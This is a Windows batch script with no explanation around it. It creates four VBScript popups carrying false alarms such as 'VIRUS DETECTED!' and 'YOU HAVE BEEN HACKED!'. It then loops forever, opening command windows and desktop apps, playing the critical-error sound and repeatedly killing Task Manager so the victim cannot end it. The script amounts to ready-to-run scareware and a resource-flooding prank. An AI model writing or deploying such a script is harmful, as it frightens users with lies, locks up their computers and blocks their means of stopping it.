(echo MsgBox "CRITICAL ERROR!" ^& vbCrLf ^& "DO NOT RESTART!",262192, "VIRUS DETECTED!")> File.vbs
(echo MsgBox "CRITICAL SYSTEM FAILURE!" ^& vbCrLf ^& "DO NOT RESTART!",262192, "VIRUS DETECTED!")> File2.vbs
(echo MsgBox "YOU HAVE BEEN HACKED!" ^& vbCrLf ^& "DO NOT RESTART OR COMPUTER WILL BE DELETED",262192, "VIRUS DETECTED!")> file3.vbs
(echo MsgBox "YOUR COMPUTER IS BEING ATTACKED!" ^& vbCrLf ^& "DO NOT RESTART!",262192, "VIRUS DETECTED!")> File4.vbs


@echo off
TIMEOUT /T 8
:x
start cmd
start File.vbs
start File2.vbs
start cmd
start file3.vbs
start File4.vbs
taskkill /IM taskmgr.exe
start C:\Windows\Media\"Windows Critical Stop.wav"
start mspaint
start File.vbs
start cmd
start File2.vbs
start file3.vbs
start File4.vbs
taskkill /IM taskmgr.exe
start C:\Windows\Media\"Windows Critical Stop.wav"
start notepad
start File.vbs
start File2.vbs
start cmd
start file3.vbs
start File4.vbs
taskkill /IM taskmgr.exe
start C:\Windows\Media\"Windows Critical Stop.wav"
start write
start File.vbs
start File2.vbs
start file3.vbs
start File4.vbs
taskkill /IM taskmgr.exe
start C:\Windows\Media\"Windows Critical Stop.wav"
start calc
start File.vbs
start File2.vbs
start file3.vbs
start File4.vbs
taskkill /IM taskmgr.exe
start C:\Windows\Media\"Windows Critical Stop.wav"
start cmd
start File.vbs
start File2.vbs
start file3.vbs
start File4.vbs
taskkill /IM taskmgr.exe
startmspaint
start C:\Windows\Media\"Windows Critical Stop.wav"
start File.vbs
start File2.vbs
start file3.vbs
start File4.vbs
taskkill /IM taskmgr.exe
start C:\Windows\Media\"Windows Critical Stop.wav"
start cmd
start File.vbs
start File2.vbs
start file3.vbs
start File4.vbs
taskkill /IM taskmgr.exe
start C:\Windows\Media\"Windows Critical Stop.wav"

goto x
